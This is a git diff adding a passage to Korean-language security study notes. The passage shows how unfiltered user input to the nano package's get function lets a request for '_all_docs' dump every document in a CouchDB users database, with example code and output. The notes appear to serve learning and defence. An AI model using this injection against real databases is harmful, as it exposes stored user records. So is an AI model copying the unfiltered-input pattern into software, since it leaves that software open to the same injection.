@@ -626,3 +626,34 @@
 <br/>
 
 * nano 패키지의 ```get``` 함수를 이용한 공격
+    - ⚠️ ```get``` 함수의 내부에서 특수 구성요소가 필터링 되어있지 않음 → 사용자의 입력을 ```get```으로 사용할 경우 의도하지 않은 행위를 수행할 수 있음
+    - 예시: 정상적인 접근과 ```/{db}/_all_docs``` 접근
+        + 정상적인 접근
+            ```javascript
+            require('nano')('http://{username}:{password}@localhost:5984').use('users').get('guest', function(err, result){ console.log('err: ', err, ', result: ', result); });
+            /* 결과
+                err: null, result: { _id: 'guest', _rev: '1-22a458e50cf189b17d50eeb295231896', upw: 'guest' }
+            */
+            ```
+            - 이용자가 요청한 users 데이터베이스의 guest 계정에 대한 정보를 얻을 수 있음 (```get``` 함수의 첫 번째 인자로 ```'guest'```를 입력함)
+        + ```/{db}/_all_docs``` 접근
+            ```javascript
+            require('nano')('http://{username}:{password}@localhost:5984').use('users').get('_all_docs', function(err, result){ console.log('err: ', err, ', result: ', result); });
+            /* 결과
+                err: null, result: { total_rows: 3, offset: 0,
+                rows:
+                    [ { id: '0c1371b65480420e678d00c2770003f3',
+                        key: '0c1371b65480420e678d00c2770003f3',
+                        value: [Object] },
+                        { id: '0c1371b65480420e678d00c277001712',
+                        key: '0c1371b65480420e678d00c277001712',
+                        value: [Object] },
+                        { id: 'guest', key: 'guest', value: [Object] } ]
+                }
+            */
+            ```
+            - users 데이터베이스의 ```_all_docs```에 접근해 저장된 데이터베이스에 대한 모든 도큐먼트를 얻을 수 있음 (```get``` 함수의 첫 번째 인자로 ```_all_docs```를 입력함)
+
+<br/>
+
+* nano 패키지의 ```find``` 함수를 이용한 공격
